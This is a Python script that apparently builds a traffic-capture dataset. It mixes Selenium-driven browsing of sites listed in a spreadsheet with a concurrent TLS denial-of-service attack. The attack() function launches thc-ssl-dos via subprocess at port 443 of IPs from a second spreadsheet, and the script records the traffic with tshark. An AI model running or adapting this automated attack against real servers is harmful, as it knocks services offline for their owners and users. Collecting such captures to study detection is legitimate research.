import os
from selenium import webdriver
import subprocess
import datetime
import logging
import socket
import random
from fake_useragent import UserAgent
import time
from urllib.request import Request, urlopen
import urllib.error
import argparse
from bs4 import BeautifulSoup
import sys
from selenium.common.exceptions import InvalidArgumentException
import pandas as pd
import numpy as np
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import InvalidSessionIdException
from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.common.exceptions import SessionNotCreatedException
from selenium.common.exceptions import WebDriverException
import http.client
import ssl
import psutil
import requests
from requests import HTTPError
from requests import Timeout
from requests import RequestException
import threading

#global variable
isAttacking = 1;
isNormal = 0;

excel_dir = "./report_unique_normal.xlsx"
excel_dir_dos = "./report_unique_dos.xlsx"
print("Reading from excel file now for the list of sites to test...")
df = pd.read_excel(excel_dir, sheet_name="complete_list")
df_dos = pd.read_excel(excel_dir_dos, sheet_name="thc-tls-dos")
dictionary = {}
dictionary_dos = {}
ip_list_normal = df['IP']
ip_list_dos = df_dos['IP']
ua = UserAgent()
length = 0

def clean_domain(url):
    if "https://" in url:
        result = url[8:]
    elif "http://" in url:
        result = url[7:]
    else:
        result = url

    if "/" in result:
        result = result.split("/")[0]

    return result

def normal(ip):
    
    # Finding the chromedriver path to start selenium web driver
    # Getting the abs path of chromedriver for selenium automation
    cdPath = "chromedriver"
    chromeDriverPath = os.path.abspath(cdPath)
    while isAttacking == 1:
        options = webdriver.ChromeOptions()
        options.add_argument('--ignore-certificate-errors')
        options.add_argument('--ignore-certificate-errors-spki-list')
        options.add_argument('--ignore-ssl-errors')
        options.add_argument('--no-sandbox')
        try:
            driver = webdriver.Chrome(chromeDriverPath, options=options)
        except SessionNotCreatedException as snce:
            logging.exception(str(snce) + " session failed to create")
            continue

        # Setting a timeout for the page load to hasten the process
        driver.set_page_load_timeout(time_to_wait=30)

        # Getting domain
        domain = dictionary[ip]
        print("testing " + domain)
        # Check if website has http
        if domain[0:7] != "http://":
            # appending https:// for urllib
            domain_urllib = "https://" + domain
        else:
            domain_urllib = domain

        print(domain_urllib)
        headers = {'User-Agent': ua.random}
        req = Request(
            domain_urllib,
            headers={'User-Agent': ua.random}
        )

        # Trying to open the URL to scrape HTML
        try:
            resp = urlopen(req).read()
        except urllib.error.HTTPError as httpe:
            logging.error(str(httpe) + " for " + domain_urllib)
            continue
        except urllib.error.URLError as urle:
            logging.error(str(urle) + " for " + domain_urllib)
            continue
        except TimeoutError as toe:
            logging.error(str(toe) + " for " + domain_urllib)
            continue
        except http.client.HTTPException as httpexcep:
            logging.error(str(httpexcep) + " for " + domain_urllib)
            continue
        except ssl.CertificateError as sslCE:
            logging.error(str(sslCE) + " for " + domain_urllib)
            continue
        except ConnectionResetError as cre:
            logging.error(str(cre) + " for " + domain_urllib)
            continue
        except UnicodeEncodeError as uee:
            logging.error(str(uee) + " for " + domain_urllib)
            continue
        except ValueError as ve:
            logging.error(str(ve) + " for " + domain_urllib)
            continue

        soup = BeautifulSoup(resp, "html.parser")
        cleanLinks = []
        for link in soup.find_all('a', href=True):
            if "javascript" not in link or "#" not in link:
                cleanLinks.append(link["href"])
        
        try:
            driver.get(domain_urllib)
        except TimeoutException as toe:
            print("Timeout, moving onto next site")
            logging.exception(str(toe) + " for " + domain_urllib)
            continue
        except InvalidSessionIdException as isie:
            print("Invalid session id, moving on to the next site")
            logging.exception(str(isie) + " for " + domain_urllib)
            continue

        # This polls for the return code of the tshark process, once 200 packets have been captured, expected return : 0
        count = 0
        timeout = 50

        #set flag = 1 once the normal traffic has started
        global isNormal
        isNormal = 1 

        while 1 and isAttacking == 1 :
            count = 1 #make counter a non factor
            return_code = sts.poll()
            if return_code == 0 or count >= timeout:
                if return_code == 0:
                    print("tshark has terminated gracefully")
                    logging.info("tshark has terminated gracefully")
                elif count >= timeout:
                    print("timeout has been reached")
                    logging.info("timeout has been reached")
                    for proc in psutil.process_iter():
                        # check whether the process name matches
                        if proc.pid == sts.pid:
                            try:
                                proc.kill()
                            except psutil.NoSuchProcess as nsp:
                                logging.error(str(nsp))
                            finally:
                                break
                        else:
                            continue
                break
            else:
                if len(cleanLinks) > 1:
                    link = random.choice(cleanLinks)
                    ip_socket = []
                    if "http" not in link and ".com" not in link:
                        seleniumLink = "https://" + domain + link
                        socketLink = domain
                    else:
                        seleniumLink = link
                        socketLink = clean_domain(link)

                    try:
                        socket_info = socket.getaddrinfo(socketLink, None)
                    except socket.gaierror as e:
                        logging.error(str(e) + " error for " + str(socketLink))
                        continue
                    except UnicodeError as e:
                        logging.error(str(e) + " error for " + str(socketLink))
                        continue

                    for info in socket_info:
                        ip_socket.append(info[4][0])

                    for ip_test in ip_socket:
                        # Introducing sleep between 3 to 8 seconds to allow simulation of user behaviour
                        #time.sleep(np.random.randint(low=3, high=8))
                        if ip_test == ip:
                            try:
                                driver.get(seleniumLink)
                                logging.info("Successfully accessed website " + str(seleniumLink))
                            except InvalidArgumentException as iae:
                                logging.info(str(iae) + "Invalid Argument Exception " + str(seleniumLink))
                                continue
                            except TimeoutException as te:
                                logging.info(str(te) + "Time Out Exception " + str(seleniumLink))
                                continue
                            except UnexpectedAlertPresentException as uape:
                                logging.exception(str(uape) + " unexpected alert present!")
                                driver.switch_to.alert.accept()
                                continue
                            except WebDriverException as wde:
                                logging.exception(str(wde) + " webdriver exception!")
                                continue
                            finally:
                                break
                        else:
                            print("Sending GET requests!")
                            logging.info("Sending GET requests to " + ip + " " + domain)
                            try:
                                requests.get("http://" + ip, headers={'User-Agent': ua.random}, timeout=5)
                            except ConnectionError as ce:
                                logging.error(str(ce))
                            except HTTPError as httperr:
                                logging.error(str(httperr))
                            except Timeout as toe:
                                logging.error(str(toe))
                            except RequestException as re:
                                logging.exception(str(re))
                            finally:
                                break
                else:
                    continue



        count = 0

        # Kill chrome processes to clear memory to avoid virtual memory problem
        parent = psutil.Process(driver.service.process.pid)
        chromeProcesses = (parent.children(recursive=True))
        if chromeProcesses != "":
        	for process in chromeProcesses:
        		p = psutil.Process(process.pid)
        		p.kill()

        try:
            driver.quit()
        except TimeoutException as toe:
            logging.exception(str(toe) + " Driver failed to close")
        except UnexpectedAlertPresentException as uape:
            logging.exception(str(uape) + " unexpected alert present!")
            driver.switch_to.alert.accept()
            driver.close()
        finally:
            driver.quit()

    # Terminate selenium
    try:
        driver.quit()
    except NameError as NE:
        logging.error(str(NE))
        driver.close()  

def attack(ip):
    while isNormal == 0 : 
        time.sleep(1)
    print('ready to attack at ' + str(ip))

    # Initializer for thc-ssl-dos
    # Declaring variables for thc-ssl-dos
    parallel_connections = 1
    port = 443
    logging.info("DDOSING at " + ip)
    thc_command = "thc-ssl-dos -l " + str(parallel_connections) + " " + ip + " " + str(port) + " " + "--accept"
    GNULL = open(os.devnull, 'w')
    thc_process = subprocess.Popen(thc_command, shell=True, stdout=GNULL)
    logging.info("Opened DOS attack at " + ip)

    # Sleeping for 25 seconds before killing them off
    time.sleep(60)
    kill_thc = "killall -s SIGTERM thc-ssl-dos"
    kill_sniff = "killall -s SIGTERM  tshark"
    os.system(kill_thc)
    os.system(kill_sniff)

    global isAttacking
    isAttacking = 0;
    print('THE ATTACK HAS STOPPED. Exiting the attack thread..')
    logging.info("DDOS finished for " + ip)


if __name__ == '__main__' : 
    # Initializing the dictionary to be able to retrieve the names easily
    # Different IP (Key) lead to same Domain (Value)
    for index, row in df.iterrows():
        domain = row['Domain']
        ip = row['IP']

        dictionary[ip] = domain

    for index, row in df_dos.iterrows():
        domain = row['Domain']
        ip = row['IP']

        dictionary_dos[ip] = domain

    if(len(dictionary) < len(dictionary_dos)):
        length = len(dictionary)
    else:
        length = len(dictionary_dos)

    logging.basicConfig(filename='mixed_traffic.log', level=logging.INFO, format='%(asctime)s-%(levelname)s-%(message)s')
    location = "/media/sf_Shared/mixed/"
    #location = "output/"
    file_path = os.path.join(location + "mixed_traffic/" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
    if not os.path.exists(file_path):
        os.makedirs(file_path)
####################for single testing########################################
    #ip_normal = ip_list_normal[0]
    #ip_dos = ip_list_dos[0]
    #isAttacking = 1
    #isNormal = 0
        # SNIFFER
        # Declaring variables for the sniffer
        # Capture filter ip_list[0] is taken as the first IP resolved to capture
        # Might not be too perfect in the case
    #abspath = os.path.abspath(file_path)
    #interface = "eth0"
    #capture_filter = "tcp port 443 and host " + ip_normal + " or " + ip_dos
    #filename = abspath + "/" + ip_normal + "_" + ip_dos + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"
    # Raw capturing
    #command = ["tshark", "-i", interface, "-c", "5000", "-f", capture_filter, "-w", filename]
    #command = ["tshark", "-i", interface, "-f", capture_filter, "-w", filename]
    #sts = subprocess.Popen(command, shell=False)
    #time.sleep(5)

    #normal = threading.Thread(target=normal, args=(ip_normal,))
    #normal.start()
    #attack = threading.Thread(target=attack, args=(ip_dos,))
    #attack.start()
##############################################################################

    for i in range(length):
        ip_dos = ip_list_dos[i]
        ip_normal = ip_list_normal[i]
        print("normal at " + ip_normal)
        print("ddos at " + ip_dos)

        isAttacking = 1
        isNormal = 0
        # SNIFFER
        # Declaring variables for the sniffer
        # Capture filter ip_list[0] is taken as the first IP resolved to capture
        # Might not be too perfect in the case
        abspath = os.path.abspath(file_path)
        interface = "eth0"
        capture_filter = "tcp port 443 and host " + ip_normal + " or " + ip_dos
        filename = abspath + "/" + ip_normal + "_" + ip_dos + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"
        # Raw capturing
        #command = ["tshark", "-i", interface, "-c", "5000", "-f", capture_filter, "-w", filename]
        command = ["tshark", "-i", interface, "-f", capture_filter, "-w", filename]
        sts = subprocess.Popen(command, shell=False)
        time.sleep(5)

        normal_t = threading.Thread(target=normal, args=(ip_normal,))
        normal_t.start()
        attack_t = threading.Thread(target=attack, args=(ip_dos,))
        attack_t.start()

        while isAttacking == 1 :
            time.sleep(2)
        print('attack has stopped..')
        normal_t.join()
        attack_t.join()
        